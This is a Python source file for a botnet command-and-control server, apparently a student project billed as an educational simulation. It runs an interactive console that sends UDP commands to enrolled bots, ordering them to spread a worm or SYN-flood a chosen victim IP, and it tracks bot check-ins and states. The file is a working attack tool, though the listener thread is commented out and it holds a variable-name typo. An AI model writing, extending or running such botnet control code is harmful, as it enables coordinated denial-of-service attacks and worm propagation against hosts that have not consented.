import socket
import logging
import threading
import time

PORT = 1337

bots = ['192.168.0.1']
bot_states = {'192.168.0.1': 1}   # k = bot address, v = bot state

logging.basicConfig(level=logging.INFO,
        format='%(asctime)s PID:%(process)d %(message)s',
        datefmt='%H:%M:%S',
        filename='./cnc.log')
        #filename='/tmp/cnc.log')
logger = logging.getLogger('')

def server_cmd():
    """ Obtains user input and parses the commands to perform botnet
    administrative duty, determine attack properties, etc.
    """
    print_banner()
    print_menu()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            user_input = raw_input('\033[1m' + 'khala_botnet$ ' + '\033[0m')
        except KeyboardInterrupt:
            sock.close()
            return

        tokens = user_input.split(' ')
        command = tokens[0].lower()

        if command == 'roll':
            roll_command(sock)

        elif command == 'attack':
            if len(tokens) == 2:
                attack_command(sock, int(tokens[1]))
            elif len(tokens) == 3:
                attack_command(sock, int(tokens[1]), tokens[2])
            else:
                print("Invalid command. Enter 'help' for options.")

        elif command == 'stop':
            stop_command(sock)

        elif command == 'list':
            list_bots()

        elif command == 'help':
            print_help()

        elif command == 'exit':
            sock.close()
            return
        else:
            print("Invalid command. Enter 'help' for options.")

def attack_command(s, atck_type=None, victim_ip=None):
    """ Depending on the attack type parameter, spread the worm or perform
    a SYN-FLOOD attack on specified address.
    """
    # Validate user input options
    if atck_type != 0 and atck_type != 1:
        print("Invalid attack type. Enter 'help' for options.")
        return

    elif atck_type == 1 and victim_ip != None:
        ip_tokens = victim_ip.split('.')

        if len(ip_tokens) != 4:
            print("Invalid IPv4 address.")
            return
        
        for octet in ip_tokens: # doesn't check if alphanumeric
            octet_len = len(octet)
            if octet_len < 1 or octet_len > 3:
                print("Invalid IPv4 address.")
                return

    elif atck_type == 1 and not victim_ip:
        print("Input victim address.")
        return

    # Set bot states to READY
    for addr in bot_states:
        if bot_states[addr] == 1:
            s.sendto('STOP', (addr, PORT))
            print("Sent 'STOP'")

    if atck_type == 0:
        for addr in bots:
            message = "ATCK::{}".format(atck_type)
            print(message) 
            s.sendto(message, (addr, PORT))
            bot_states[addr] = 1 # update bot to busy state
    else:
        for addr in bots:
            message = "ATCK::{}::{}".format(atck_type, victim_ip)
            print(message)
            s.sendto(message, (addr, PORT))
            bot_states[addr] = 1

def stop_command(s):
    """ Send a 'STOP' message to all enrolled bots and reset states to ready.
    """
    for addr in bots:
        if bot_states[addr] == 1:
            print('STOP')
            s.sendto('STOP', (addr, PORT))
        s.sendto('ROLL', (addr, PORT))  # Reset state to ready

def roll_command(s):
    """ Check in on status of bots. Sends the bots a ROLL message where they
    respond with their states.
    """
    for addr in bots:
        s.sendto('ROLL', (addr, PORT))
        print('ROLL sent to {}'.format(addr))
    #logger.info('All bot statuses updated.')

def bot_listener():
    """ Listens on specified port for bot responses, adds bots if not
    enrolled, and updates their states.
    Possible responses:
        1. 'HELO' - Provides server with notification to keep bot enrolled.
        2. 'REDY' - Bot state informs server that it's ready for commands.
        3. 'BUSY' - Bot state informs server that it's currently attacking.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', PORT))

    while True:
        bot_resp, client_addr = sock.recvfrom(1024)

        if bot_resp == 'HELO':
            logger.info("Received 'HELO' from: {}".format(client_addr))
            if client_addr not in bots:
                bots.append(client_addr)
                bot_states[cliend_addr] = -1 # sets -1 for unintialized state

        elif bot_resp == 'REDY':
            bot_states[client_addr] = 0
            logger.info("Received 'REDY' from: {}".format(client_addr))

        elif bot_resp == 'BUSY':
            bot_states[client_addr] = 1
            logger.info("Received 'BUSY' from {}".format(client_addr))

def list_bots():
    ready = []
    busy = []
    bot_count = len(bot_states)

    for addr in bot_states.keys():
        if bot_states[addr] == 0:
            ready.append(addr)
        elif bot_states[addr] == 1:
            busy.append(addr)

    print(ready)
    print(busy)
    print(bot_count)

def server_driver():
    server_cmd()
    #threading.Thread(target=bot_listener).start()

def print_menu():
    print("""
\033[1mOPTIONS:\033[0m
    \033[1mroll\033[0m
    \033[1mstop\033[0m
    \033[1mattack <attack type> <victim ip>\033[0m
    \033[1mlist\033[0m
    \033[1mhelp\033[0m
    \033[1mexit\033[0m
    """)

def print_help():
    print("""
\033[1musage:\033[0m command <type> <victim>

\033[1mcommands:\033[0m
    roll
        Check on status of enrolled bots and add those not already enrolled.
    stop
        Stop all current attacks and reset bot states to ready.
    attack <attack type> <victim ip>
        <attack type> - 0 or 1 where 0 = spread worm and 1 = SYN-FLOOD
        <victim ip> - valid IPv4 address of victim.
    list
        Show bots that are ready, busy, and number of bots enrolled.
    help
    exit
    """)

def print_banner():
    print(""" ____  __.__           .__           __________        __                 __
|    |/ _|  |__ _____  |  | _____    \______   \ _____/  |_  ____   _____/  |_
|      < |  |  \\\\__  \\ |  | \\__  \\    |    |  _//  _ \\   __\\/    \\_/ __ \\   __\\
|    |  \|   Y  \/ __ \|  |__/ __ \_  |    |   (  <_> )  | |   |  \  ___/|  |
|____|__ \___|  (____  /____(____  /  |______  /\____/|__| |___|  /\___  >__|
        \/    \/     \/          \/          \/                 \/     \/

Simple botnet implementation to simulate distributed SYN-FLOOD attacks for educational purposes only.""")

if __name__ == '__main__':
    server_driver()
